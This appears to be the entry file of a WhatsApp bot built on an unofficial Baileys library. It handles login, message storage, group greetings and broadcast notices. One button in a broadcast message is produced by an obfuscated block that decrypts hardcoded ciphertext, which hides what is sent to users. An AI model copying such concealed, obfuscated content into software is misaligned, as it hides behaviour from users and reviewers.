const {
    makeWASocket,
    AnyMessageContent,
    BinaryInfo,
    delay,
    DisconnectReason,
    downloadAndProcessHistorySyncNotification,
    encodeWAM,
    fetchLatestBaileysVersion,
    getAggregateVotesInPollMessage,
    getHistoryMsg,
    isJidNewsletter,
    isJidBroadcast,
    jidNormalizedUser,
    Browsers,
    makeCacheableSignalKeyStore,
    makeInMemoryStore,
    proto,

    useMultiFileAuthState,
    WAMessageContent,
    WAMessageKey
} = require('@hansaka02/baileys');
const path = require('path');
const { makeWASocket: WAConnection } = require('waconnection');
; // for first-time QR login
const authPath = path.join(__dirname, 'auth5a');
require('dotenv').config()
const { handleHangman, checkInactiveGames } = require('./hangman.js');
// const Ai = require('./res/js/ollama')
// Ai.initialize()
const pino = require("pino");
const alexasock = require('ws');
//const art = require('ascii-art');
let isNewLogin = null;
//const app = require('./server');
const baileys = require('@hansaka02/baileys')
const mysql = require("mysql2");
const DB_HOST = process.env["DB_HOST"];
const DB_UNAME = process.env["DB_UNAME"];
const DB_NAME = process.env["DB_NAME"];
const DB_PASS = process.env["DB_PASS"];
const DB_PORT = process.env["DB_PORT"] || 3306 ;
// Example in browser JavaScript
const alexasocket = new alexasock(`${process.env.Alexasock_url}`);

alexasocket.onopen = () => {
  // Register with a unique ID
  alexasocket.send(JSON.stringify({
    type: "register",
    id: "app1" 
  }));
};


const getBuffer = async (url, options) => {
    try {
        options ? options : {}
        const res = await axios({
            method: "get",
            url,
            headers: {
                'DNT': 1,
                'Upgrade-Insecure-Request': 1
            },
            ...options,
            responseType: 'arraybuffer'
        })
        return res.data
    } catch (err) {
        return err
    }
}



require('./whatsappState'); // Import shared state
const {
    handleMessage
} = require('./bot'); // Import message handler
const chalk = require('kleur');
const {
    default: P
} = require("pino");
const express = require('express');
const NodeCache = require('node-cache');

const session = require('express-session');
const fs = require('fs');

const STORE_DIR = "./store";
if (!fs.existsSync(STORE_DIR)) fs.mkdirSync(STORE_DIR);
const msgRetryCounterCache = new NodeCache();
const PORT = process.env.PORT || 8000;
const dataFile = path.join(__dirname, 'sharedData.json');
const si = require('systeminformation');
const WebSocket = require('ws');
const { default: axios } = require('axios');
const { json } = require('stream/consumers');
const logger = P({
    timestamp: () => `,"time":"${new Date().toJSON()}"`
}, P.destination('./wa-logs.txt'));
logger.level = 'debug';

let restartHistory = JSON.parse(fs.readFileSync('./restarts.json', 'utf8'));
/**
 * Saves a message to a JSON file, now including media URL and mimetype.
 * Assumes 'fs', 'path', and 'STORE_DIR' are defined globally.
 */
/**
 * Saves a message, including media decryption keys (mediaKey, iv, etc.).
 * Converts Buffers to base64 for JSON storage.
 */

/**
 * Parses the raw message object into a simple, usable format.
 * @param {object} msg The raw Baileys message object
 * @returns {object} A simplified message object
 */
/**
 * Parses the raw message object into a simple, usable format.
 * Handles Ephemeral and ViewOnce unwrapping automatically.
 */
function parseMessage(msg, AlexaInc) {
    if (!msg || !msg.message) return {};

    // 1. Unwrap Ephemeral / ViewOnce messages to get real content
    let m = msg.message;
    if (m.ephemeralMessage) {
        m = m.ephemeralMessage.message;
    }
    if (m.viewOnceMessage) {
        m = m.viewOnceMessage.message;
    }

    // 2. Get the Message Type safely
    const getContentType = (content) => {
        if (!content) return null;
        const keys = Object.keys(content);
        const key = keys.find(k => (k === 'conversation' || k.endsWith('Message')) && k !== 'senderKeyDistributionMessage' && k !== 'messageContextInfo');
        return key;
    };

    const msgType = getContentType(m);
    const messageContent = m[msgType];

    if (!messageContent) return {};

    const contextInfo = messageContent.contextInfo;

    // 3. Get the full text (from caption or text)
    const text = messageContent.text || messageContent.caption || messageContent.conversation || "";

    // 4. Handle Reply Info
    const quotedid = contextInfo?.stanzaId;
    let replyInfo = null;
    
    if (contextInfo?.quotedMessage) {
        const quoted = contextInfo.quotedMessage;
        const quotedType = getContentType(quoted);
        const quotedContent = quoted[quotedType];
        let quotedText = "";

        if (quotedContent) {
            quotedText = quotedContent.text || quotedContent.caption || quotedContent.conversation || "";
        }

        replyInfo = {
            sender: contextInfo.participant,
            messageId: contextInfo.stanzaId,
            messageText: quotedText,
        };
    }

    // 5. Get sender info
    const isGroup = msg.key.remoteJid.endsWith("@g.us");
     const remoteJid = msg.key.remoteJid;
    const isDirectMessage = !remoteJid.endsWith('@g.us');



    let rawParticipant, rawParticipantAlt;

    if (isDirectMessage) {
        rawParticipant = remoteJid;
        rawParticipantAlt = msg.key.remoteJidAlt;
    } else {
        rawParticipant = msg.key.participant;
        rawParticipantAlt = msg.key.participantAlt;
    }

    let finalJid = null; 
    let finalLid = null;

    if (rawParticipant?.endsWith('@lid')) {
        finalLid = rawParticipant;
        finalJid = rawParticipantAlt; 
    } else if (rawParticipantAlt?.endsWith('@s.whatsapp.net')) {
        finalJid = rawParticipantAlt;
        finalLid = rawParticipant;
    } else {
        finalJid = rawParticipant;
        finalLid = rawParticipantAlt;
    }
    const sender = finalLid;

    // 6. Command parsing
    const prefix = /^[./!]/; 
    const body = text.trim().split(/ +/);
    const commandWithPrefix = body.shift().toLowerCase();
    
    let command = null;
    let commandText = text; 

    if (prefix.test(commandWithPrefix)) {
        command = commandWithPrefix.slice(1);
        commandText = body.join(' '); 
    }

    // --- Return a clean, simple object ---
    return {
        msg, // Original raw message (kept for references like .key)
        msgType,
        messageContent, // The UNWRAPPED content
        contextInfo,
        replyInfo,
        text: text,
        command: command,
        commandText: commandText,
        quotedid: quotedid,
        mentionedJids: contextInfo?.mentionedJid || [],
        sender: sender,
        senderJid: finalJid,
        senderlid:finalLid,
        isGroup: isGroup,
        fromMe: msg.key.fromMe,
        jid: msg.key.remoteJid,
        pushName: msg.pushName
    };
}


/**
 * Saves a message, including media decryption keys (mediaKey, iv, etc.).
 * Converts Buffers to base64 for JSON storage.
 */
function getContentType(content) {
    if (!content) return null;
    const keys = Object.keys(content);
    const key = keys.find(k => (k === 'conversation' || k.endsWith('Message')) && k !== 'senderKeyDistributionMessage' && k !== 'messageContextInfo');
    return key;
}

/**
 * Saves a message using the ALREADY PARSED object.
 * Drastically reduces processing time by avoiding re-parsing.
 * @param {string} jid 
 * @param {object} p - The parsed message object returned by parseMessage()
 */
function saveMessage(jid, p) {
    // Basic validation using the parsed object
    if (!jid || !p || !p.messageContent) return;

    const filePath = path.join(STORE_DIR, `${jid}.json`);
    let chatData = [];

    // Load existing messages
    if (fs.existsSync(filePath)) {
        try {
            chatData = JSON.parse(fs.readFileSync(filePath));
        } catch {
            chatData = [];
        }
    }

    // --- Media Logic (Extracting from p.messageContent) ---
    // We don't need to check msgType string matching, we just check if the properties exist
    const content = p.messageContent;
    
    const mediaUrl = content.url || null;
    const mediaMimetype = content.mimetype || null;
    const mediaKey = content.mediaKey?.toString('base64') || null;
    const mediaIv = content.iv?.toString('base64') || null;
    const mediaFileEncSha256 = content.fileEncSha256?.toString('base64') || null;
    const mediaFileSha256 = content.fileSha256?.toString('base64') || null;

    // --- Formatted Object ---
    const formatted = {
        sender: p.fromMe ? "me" : p.sender,
        pushname: p.pushName,
        messageId: p.msg.key.id, // Accessing key from the raw msg inside p
        messageText: p.text,     // Already extracted text
        type: p.msgType,
        
        // Media details
        mediaUrl,
        mediaMimetype,
        mediaKey,
        mediaIv,
        mediaFileEncSha256,
        mediaFileSha256,

        reply: p.replyInfo,
        timestamp: p.msg.messageTimestamp
    };

    // Avoid duplicates
    if (!chatData.find(m => m.messageId === formatted.messageId)) {
        chatData.push(formatted);
        
        // Only keep last 500
        if (chatData.length > 500) chatData = chatData.slice(-500);

        fs.writeFileSync(filePath, JSON.stringify(chatData, null, 2));
    }
}


function loadMessage(jid, messageId) {
  if (!jid || !messageId) return null;

  const filePath = path.join(STORE_DIR, `${jid}.json`);
  if (!fs.existsSync(filePath)) return null;

  try {
    const chatData = JSON.parse(fs.readFileSync(filePath));
    return chatData.find(m => m.messageId === messageId) || null;
  } catch {
    return null;
  }
}

/**
 * Load messages between two messageIds (inclusive).
 * Works for opaque IDs (UUID/hex) by slicing array indices.
 * If all messageIds are numeric strings, it will do numeric range filtering.
 *
 * @param {string} jid - chat file base name (without .json)
 * @param {string} startId
 * @param {string} endId
 * @returns {Array} array of message objects (empty array if none/failure)
 */
function loadMessagesBetween(jid, startId, endId) {
  if (!jid || !startId || !endId) return [];

  const filePath = path.join(STORE_DIR, `${jid}.json`);
  if (!fs.existsSync(filePath)) return [];

  try {
    const chatData = JSON.parse(fs.readFileSync(filePath, 'utf8'));
    if (!Array.isArray(chatData)) return [];

    // If all messageId values are numeric-ish, do numeric filtering (backwards compatible)
    const allNumeric = chatData.every(m => /^[+-]?\d+$/.test(String(m.messageId)));
    if (allNumeric) {
      const start = parseInt(startId, 10);
      const end = parseInt(endId, 10);
      if (Number.isNaN(start) || Number.isNaN(end)) return [];

      const low = Math.min(start, end);
      const high = Math.max(start, end);

      return chatData.filter(m => {
        const idNum = parseInt(m.messageId, 10);
        return idNum >= low && idNum <= high;
      });
    }

    // Non-numeric IDs: find indices in array and slice
    const findFirstIndex = (id) => {
      for (let i = 0; i < chatData.length; i++) {
        if (String(chatData[i].messageId) === String(id)) return i;
      }
      return -1;
    };

    const findLastIndex = (id) => {
      for (let i = chatData.length - 1; i >= 0; i--) {
        if (String(chatData[i].messageId) === String(id)) return i;
      }
      return -1;
    };

    let startIndex = findFirstIndex(startId);
    let endIndex = findLastIndex(endId);

    // if either id not found, return empty array
    if (startIndex === -1 || endIndex === -1) return [];

    // if end comes before start, swap so we still return a contiguous block
    if (endIndex < startIndex) {
      const tmp = startIndex;
      startIndex = endIndex;
      endIndex = tmp;
    }

    return chatData.slice(startIndex, endIndex + 1);
  } catch (err) {
    console.error('Failed to load messages:', err);
    return [];
  }
}







// const STORE_DIR2 = path.join(__dirname, "store_ev");
// if (!fs.existsSync(STORE_DIR2)) fs.mkdirSync(STORE_DIR2);

// // Save any event
// function saveEvent(eventName, data) {
//   const filePath = path.join(STORE_DIR2, `${eventName}.json`);
//   let existing = [];

//   if (fs.existsSync(filePath)) {
//     try {
//       existing = JSON.parse(fs.readFileSync(filePath));
//     } catch {
//       existing = [];
//     }
//   }

//   existing.push({
//     timestamp: Date.now(),
//     data,
//   });

//   // Optional: keep last 500 events per type
//   if (existing.length > 500) existing = existing.slice(-500);

//   fs.writeFileSync(filePath, JSON.stringify(existing, null, 2));
// }

// // Load events of a certain type
// function loadEvents(eventName) {
//   const filePath = path.join(STORE_DIR2, `${eventName}.json`);
//   if (!fs.existsSync(filePath)) return [];
//   try {
//     return JSON.parse(fs.readFileSync(filePath));
//   } catch {
//     return [];
//   }
// }














const db = mysql.createPool({
  host: DB_HOST,
  user: DB_UNAME,
  password: DB_PASS,
  database: DB_NAME,
  port:DB_PORT
});

db.getConnection((err) => {
  if (err) {
    console.error("Error connecting to MySQL:", err);
  } else {
    console.log("Connected to MySQL");
  }
});

// Store logs in an array, now also keeping HTML-styled logs
const SESSION_FOLDER = './auth5a'

async function startWhatsAppConnection() {


    // 1. Display ASCII logo
    fs.readFile('./res/ascii.txt', 'utf8', (err, data) => {
        if (err) return console.error('Error reading ASCII:', err);
        console.log(data);
    });
    const sessionExists = fs.existsSync(authPath) && fs.readdirSync(authPath).length > 0;
    // 3. Browser info
    const APP_NAME = 'Alexa';
    const ORGANIZATION_NAME = 'AlexaInc';
    const APP_VERSION = '3.0.0';

    const CustomBrowsersMap = {
        appropriate: () => [ORGANIZATION_NAME, APP_NAME, APP_VERSION]
    };
    if (!sessionExists) {
        console.log("❌ No session found, using WhiskeySocket to create creds...");
const { state, saveCreds } = await useMultiFileAuthState(authPath);
        const wsSock = WAConnection({
            browser: CustomBrowsersMap.appropriate(),
            auth: { creds: state.creds }
        });

        wsSock.ev.on('connection.update', (update) => {
            const { connection, lastDisconnect, qr } = update;

            if (qr){
                            console.log('\n📌 Scan this QR code with WhatsApp:\n');
            const qrcode = require('qrcode-terminal');
            qrcode.generate(qr, { small: true });
            }; // show QR code yourself

            if (connection === 'open') {
                console.log("✅ WhiskeySocket login done, creds.json ready");
                wsSock.ev.removeAllListeners();
                startWhatsAppConnection(); // now start Baileys normally
            }

            if (connection === 'close') {
                            const reason = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.error?.message;
           
            if (reason !== 401) setTimeout(startWhatsAppConnection, 5000);
                console.log("❌ Connection closed");
                if (lastDisconnect?.error?.output?.statusCode === 401) {
                    console.log("❌ Auth failed, removing folder...");
                    fs.rmSync(authFolder, { recursive: true, force: true });
                    startWhatsAppConnection();
                }
            }
        });

        wsSock.ev.on('creds.update', saveCreds);
        return;
    }

    console.log("✅ Session exists, start normal Baileys connection...");
    // 2. Fetch auth and Baileys version
    const { state, saveCreds } = await useMultiFileAuthState(authPath);
    const { version, isLatest } = await fetchLatestBaileysVersion();
    console.log(`using WA v${version.join('.')}, isLatest: ${isLatest}`);



    // 4. Create the WhatsApp connection
    const AlexaInc = makeWASocket({
        version,
        logger: P({ level: 'fatal' }),
        browser: CustomBrowsersMap.appropriate(),
        printQRInTerminal: false, // handle QR manually
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, P({ level: 'fatal' }))
        },
        msgRetryCounterCache: new Map(),
        generateHighQualityLinkPreview: true,
        shouldIgnoreJid: isJidBroadcast
    });

    // 5. QR & credentials handling
    AlexaInc.ev.on('connection.update', update => {
        const { connection, lastDisconnect, qr, isNewLogin } = update;

        if (qr) {
            console.log('\n📌 Scan this QR code with WhatsApp:\n');
            const qrcode = require('qrcode-terminal');
            qrcode.generate(qr, { small: true });
        }

        if (connection === 'open') {
            global.botPhoneNumber = AlexaInc.user?.id?.split(':')[0] || null;
            global.connectionStatus = global.botPhoneNumber ? 'Online' : 'Offline';
            console.log('✅ WhatsApp bot connected!');

            // Send startup message to owner
            const fownerNumber = process.env["Owner_nb"]?.split(",")[0]?.trim();
            const lastLog = restartHistory?.[restartHistory.length - 1];
            const logmessage = `Your bot Alexa is ready!\nRestart id: ${lastLog?.id || 'N/A'} at ${lastLog?.timestamp || 'N/A'}\nReason: ${lastLog?.reason || 'Startup'}`;

            if (fownerNumber) {
                AlexaInc.sendMessage(`${fownerNumber}@s.whatsapp.net`, { text: logmessage }).catch(console.error);
            }
            try{
 AlexaInc.sendMessage(`120363407628540320@g.us`, { text: logmessage }).catch(console.error);
            
            } catch{
                
            }
               
        }

        if (connection === 'close') {
            const reason = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.error?.message;
            console.log('❌ Connection closed:', reason);

            // Retry if not a logout
            if (reason !== 401) setTimeout(startWhatsAppConnection, 5000);
        }

        if (isNewLogin) {
            console.log('🔄 New login detected, restarting...');
            setTimeout(startWhatsAppConnection, 5000);
        }
    });

    AlexaInc.ev.on('creds.update', saveCreds);

    // 6. Call handling
AlexaInc.ev.on('call', async callData => {
    for (let call of callData) {
        // Only proceed if the call is an incoming 'offer' AND it is NOT a group call
                    const callId = call.id;
                            const callFrom = call.from;
        if (call.status === 'offer' && !call.isGroup) {

    
            console.log("📞 Incoming Private Call:", callFrom);

            try {
                // Reject the call
                await AlexaInc.rejectCall(callId, callFrom);
                
                // Send a notification message to the user
                // await AlexaInc.sendMessage(callFrom, { 
                //     text: '🚫 *Do not call the bot!* Your call has been rejected automatically.' 
                // });
            } catch (err) {
                console.error("Call reject error:", err);
            }
        } else if (call.isGroup) {
            console.log("👥 Group call ignored from:", call.from);
            await AlexaInc.rejectCall(callId, callFrom);
        }
    }
});

AlexaInc.ev.on('group-participants.update', async (anu) => {
    try {
        const botNumber = AlexaInc.user.id.split(':')[0] + '@s.whatsapp.net';
        
        // 1. Standardize participants list
        const rawParticipants = anu.participants.map(p => {
            if (typeof p === 'string') return p;
            return p.phoneNumber || p.id;
        });

        // 2. Ignore if the bot itself is the one involved
        if (rawParticipants.includes(botNumber)) return;

        // 3. Fetch Group Settings from Database
        const query = "SELECT * FROM `groups` WHERE group_id = ?";
        
        db.query(query, [anu.id], async (err, result) => {
            if (err) {
                console.error("Error checking group settings:", err);
                return;
            }

            // If group is not in DB, stop
            if (result.length === 0) return;

            const settings = result[0];
            const action = anu.action;

            // --- Toggle Checks ---
            // If action is Add but Welcome is OFF -> Return
            if (action === 'add' && !settings.is_welcome) return;
            // If action is Leave/Remove but Goodbye is OFF -> Return
            if ((action === 'remove' || action === 'leave') && !settings.isleft_w) return;


            // 4. Fetch Group Metadata
            let groupMetadata;
            try {
                groupMetadata = await AlexaInc.groupMetadata(anu.id);
            } catch (e) { return; }

            const groupName = groupMetadata.subject;
            const groupDesc = groupMetadata.desc || 'No description available.';
            const groupJid = anu.id;
            
            // 5. Get User Profile Picture (Fallback if private/missing)
            let ppUrl;
            try {
                ppUrl = await AlexaInc.profilePictureUrl(rawParticipants[0], 'image');
            } catch {
                ppUrl = 'https://pngimg.com/uploads/anime_girl/anime_girl_PNG33.png';
            }
            const buffer = await getBuffer(ppUrl);


            // 6. Define Replacement Variables
            const userJid = rawParticipants[0];                // 947xxx@s.whatsapp.net
            const userId = userJid.split('@')[0];              // 947xxx (Number only)
            const mentionTag = `@${userId}`;                   // @947xxx (Tag format)
            
            // Try to get Username (Pushname)
            let userName = userId;
            try {
                // If you have a store/contact function, use it here. 
                // Otherwise this defaults to using the number.
                 userName = userId; 
            } catch { }


            // 7. Select Message Content
            let messageBody = '';

            if (action === 'add') {
                // --- ADD ---
                messageBody = (settings.wc_m && settings.wc_m !== 'default') 
                    ? settings.wc_m 
                    : 'Hi {mention}, Welcome to {gname}!\n\n{desc}';
            
            } else if (action === 'leave') {
                // --- LEAVE (Voluntary) ---
                messageBody = (settings.left_m && settings.left_m !== 'default') 
                    ? settings.left_m 
                    : 'Goodbye {mention}, we will miss you from {gname}.';

            } else if (action === 'remove') {
                // --- REMOVE (Kicked) ---
                // Fixed message that admins cannot change
                messageBody = '⚠️ {mention} has been removed from the group by an admin.';
            }

            // 8. Perform Replacements
            const finalMsg = messageBody
                .replace(/{id}/g, userId)          // Shows ID: 947xxx
                .replace(/{mention}/g, mentionTag) // Shows Blue Tag: @947xxx
                .replace(/{user}/g, mentionTag)      // Shows Username: Hansaka
                .replace(/{gname}/g, groupName)    // Group Name
                .replace(/{desc}/g, groupDesc)     // Description
                .replace(/{gid}/g, groupJid);      // Group ID


            // 9. Send the Message
            await AlexaInc.sendMessage(anu.id, {
                image: buffer,
                caption: finalMsg,
                // IMPORTANT: Passing 'mentions' here ensures the user is notified (Ghost Mention)
                // even if you used {user} instead of {mention} in the text.
                mentions: rawParticipants 
            });
        });

    } catch (err) {
        console.error("Error in group-participants.update:", err);
    }
});
    
alexasocket.onmessage = async (event) => {
  const data = JSON.parse(event.data);

  if (data.type === 'data') {

    if(data.payload?.event =="gitpush"){
const interactiveButtons = [{
            name: 'cta_url',
            buttonParamsJson: JSON.stringify({
               display_text: `Contact Owner`,
               url: `https://wa.me/94740970377?text=${encodeURIComponent(`hello can you tell more info about alexa`)}`
            })
        },{
            name: 'cta_url',
            buttonParamsJson: JSON.stringify({
               display_text: `message to alexa`,
               url: `https://wa.me/${process.env.bot_nb}?text=${encodeURIComponent(`hello can you tell more info about alexa`)}`
            })
        },
((function(){function _0x5575(){const _0x2ab64d=['gdg542e5yigfgafa_xhfiha()adddaddadafp9789gd46','39054jAYRdh','update','parse','createDecipheriv','98681PVcceu','final','hex','26769Bpobks','165361YbsHUd','37twUwma','from','250HBwXLJ','9USCoBR','utf8','8494020KDkYSs','12QmJApV','5ff6951d857b9f0c13a9c79677aa0959:cdb946d298271bc06ef9737d745cd04c:42621e2aa8353f4b55ce3a47d42d7d9117f4aea6742b52c56afd252005597f3ba180419632567690d0e92a392907d297ffc23eee26b7dc71636e73bdbd13884b7d0caa4e80d0670207948abf722b8bc441bf5bf653e38d0c5b00f25d07178e41452e66652d31a9a081fb729900e6a4c489f130c574d123cb1094','2352920oKHSou','3726880idfZVY','split','316Zhrigs'];_0x5575=function(){return _0x2ab64d;};return _0x5575();}function _0x3598(_0x22aa60,_0x28f17f){const _0x55752f=_0x5575();return _0x3598=function(_0x3598ab,_0x50cfe4){_0x3598ab=_0x3598ab-0x19f;let _0x3dc7c0=_0x55752f[_0x3598ab];return _0x3dc7c0;},_0x3598(_0x22aa60,_0x28f17f);}const _0x49c926=_0x3598;(function(_0xf77d33,_0x330ae1){const _0x536d3d=_0x3598,_0x3291aa=_0xf77d33();while(!![]){try{const _0xbd3b7c=-parseInt(_0x536d3d(0x1a9))/0x1*(parseInt(_0x536d3d(0x1a0))/0x2)+parseInt(_0x536d3d(0x1a7))/0x3*(parseInt(_0x536d3d(0x1b4))/0x4)+-parseInt(_0x536d3d(0x1b2))/0x5+parseInt(_0x536d3d(0x1af))/0x6*(-parseInt(_0x536d3d(0x1a8))/0x7)+-parseInt(_0x536d3d(0x1b1))/0x8*(-parseInt(_0x536d3d(0x1ac))/0x9)+parseInt(_0x536d3d(0x1ab))/0xa*(parseInt(_0x536d3d(0x1a4))/0xb)+parseInt(_0x536d3d(0x1ae))/0xc;if(_0xbd3b7c===_0x330ae1)break;else _0x3291aa['push'](_0x3291aa['shift']());}catch(_0x182348){_0x3291aa['push'](_0x3291aa['shift']());}}}(_0x5575,0x65915));return JSON[_0x49c926(0x1a2)]((_0x583e9d=>{const _0x52ae49=_0x49c926;try{const _0x283399=require('crypto'),[_0x5922ad,_0xccecd5,_0x49cb07]=_0x583e9d[_0x52ae49(0x1b3)](':'),_0x10e077=_0x283399['scryptSync'](_0x52ae49(0x19f),_0x52ae49(0x19f),0x20),_0x11b14a=_0x283399[_0x52ae49(0x1a3)]('aes-256-gcm',_0x10e077,Buffer[_0x52ae49(0x1aa)](_0x5922ad,_0x52ae49(0x1a6)));return _0x11b14a['setAuthTag'](Buffer[_0x52ae49(0x1aa)](_0xccecd5,_0x52ae49(0x1a6))),_0x11b14a[_0x49c926(0x1a1)](_0x49cb07,_0x52ae49(0x1a6),_0x52ae49(0x1ad))+_0x11b14a[_0x49c926(0x1a5)](_0x52ae49(0x1ad));}catch(_0x583c7d){return null;}})(_0x49c926(0x1b0)));})())
];

const interactiveMessage = {
  image: {url: './res/img/alexa.jpg'},
  caption: data.payload.message,
  footer: "Powered by HANSAKA",
  interactiveButtons
};
        AlexaInc.sendMessage(process.env.ocid,interactiveMessage)

          const fownerNumber = process.env["Owner_nb"].split(",")[0].trim();

const { setTimeout: wait } = require('timers/promises');

const groups = await AlexaInc.groupFetchAllParticipating();
const groupIds = Object.keys(groups);

// console.log(`[Broadcast] Starting to send to ${groupIds.length} groups...`);

// for (const group of groupIds) {
//     try {
//         await AlexaInc.sendMessage(group, interactiveMessage);
//         // console.log(`[Broadcast] Successfully sent to: ${group}`);
//         await wait(10000);

//     } catch (error) {
//         console.error(`[Broadcast] Failed to send to ${group}:`, error.message);
//         if (error.data === 429) {
//             console.log("Rate limit hit. Waiting 30 seconds before retrying next group...");
//             await wait(30000); // Wait 30 seconds
//         }
//     }
// }
//                 AlexaInc.sendMessage(`${fownerNumber}@s.whatsapp.net`, {text:'[Broadcast] All messages sent!'})
// // console.log('[Broadcast] All messages sent!');

    }
    console.log(`Received message from: ${data.from}`); // "app1"
    console.log(`Payload:`, data.payload); // { message: "Hello App2!", value: 12345 }
  } 
  else if (data.type === 'status') {
    console.log(`Server status: ${data.message}`); // "Registration successful"
  }
  else if (data.type === 'error') {
    console.error(`Server error: ${data.message}`);
  }
};
AlexaInc.ev.on('messages.upsert', async (m) => {
    const { messages, type } = m; 
    if (!messages?.length) return;

    const msg = messages[0];
    const jid = msg.key.remoteJid;

    const p = await parseMessage(msg, AlexaInc);

    await saveMessage(jid, p);
    handleMessage(AlexaInc, m, loadMessage, saveMessage, p, alexasocket);
});



    // 8. Inactive game checker
    setInterval(() => checkInactiveGames(AlexaInc), 60000);
    const { 
    checkInactiveChainGames 
} = require('./res/js/wordchain.js');
    setInterval(() => {
    checkInactiveChainGames(AlexaInc);
}, 60000); // Check every minute
}

startWhatsAppConnection();


// Log initialization
function writeData(data) {
  fs.writeFileSync(dataFile, JSON.stringify(data));
}

setInterval(() => {
  const data = { number: global.botPhoneNumber , status: global.connectionStatus };
  writeData(data);
  //console.log('Data written to shared file:', data);
}, 5000); // Write data every 5 seconds



// Function to delete logs directory
function safeSave() {
    if (global.saveRankingCacheOnExit) {
        try {
            global.saveRankingCacheOnExit();
        } catch (e) {
            console.error("Error saving cache on exit:", e);
        }
    }
}

// 1. Normal exit
process.on('exit', () => {
    safeSave(); // <--- Add this
    const data = { number: null , status: 'Offline' };
    writeData(data);
});

// 2. Ctrl + C
process.on("SIGINT", () => {
    console.log("\n⚠️ Process interrupted (SIGINT)");
    safeSave(); // <--- Add this
    const data = { number: null , status: 'Offline' };
    writeData(data);
    process.exit(0);
});

// 3. Kill command
process.on("SIGTERM", () => {
    console.log("\n⚠️ Process terminated (SIGTERM)");
    safeSave(); // <--- Add this
    const data = { number: null , status: 'Offline' };
    writeData(data);
    process.exit(0);
});

// 4. Unhandled error
process.on("uncaughtException", (err) => {
    console.error("❌ Uncaught Exception:", err);
    safeSave(); // <--- Add this
    const data = { number: null , status: 'Offline' };
    writeData(data);
    process.exit(1);
});

// 5. Before Exit
process.on('beforeExit', () => {
    safeSave(); // <--- Add this
    const data = { number: null , status: 'Offline' };
    writeData(data);
    console.log('index.js stopped, data set to null');
});